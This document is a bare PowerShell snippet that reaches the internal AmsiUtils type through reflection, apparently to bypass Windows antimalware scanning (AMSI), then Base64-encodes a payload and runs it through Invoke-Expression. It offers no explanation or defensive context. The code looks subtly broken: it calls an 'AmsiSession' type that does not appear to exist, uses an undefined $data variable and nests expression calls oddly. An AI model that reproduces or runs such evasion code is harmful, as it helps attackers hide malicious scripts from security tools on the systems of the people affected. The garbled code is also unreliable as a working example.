$payload = @"
try {
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiContext', [System.Reflection.BindingFlags]'Static,NonPublic')
$c = $b.GetValue($null)
$d = [System.Management.Automation.AmsiSession]::new($a, $c)
Invoke-Expression (iex ". { $data } 2>&1" | Out-String )
} catch {}
"@

$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedPayload)))
